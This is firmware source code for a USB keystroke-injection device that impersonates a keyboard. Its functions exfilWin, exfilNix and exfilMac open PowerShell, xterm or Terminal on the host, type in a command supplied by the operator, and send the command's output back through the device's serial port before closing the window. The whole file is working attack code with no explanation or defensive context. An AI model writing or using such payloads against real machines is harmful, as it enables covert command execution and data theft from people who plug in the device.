void exfilWin(char *SomeCommand){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(F("powershell"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(5000);
  Keyboard.print("$a=[System.IO.Ports.SerialPort]::getportnames();$attack=");
  delay(300);
  Keyboard.print(SomeCommand);
  delay(300);
  Keyboard.println(";$port=new-Object System.IO.Ports.SerialPort $a,115200,None,8,one;$port.open();$port.WriteLine(\"ExfilWin:$attack\");$port.close();exit;");
}

void exfilNix(char *SomeCommand){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("xterm");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.print("sleep .5;stty -F /dev/serial/by-id/*Raspberry* 115200;echo -e \"ExfilNix:\"$(");
  delay(2000);
  Keyboard.print(SomeCommand);
  delay(2000);
  Keyboard.print(")\"\" > /dev/serial/by-id/*Raspberry*");
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.print("exit");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}

void exfilMac(char *SomeCommand){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print(F("Terminal"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(3000);
  Keyboard.print(F("sleep .5;stty -F /dev/cu.usbmodemHID* 115200;echo -e \"ExfilMac:\"$("));
  delay(300);
  Keyboard.print(SomeCommand);
  delay(300);
  Keyboard.print(F(")\"\" > /dev/cu.usbmodemHID*"));
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
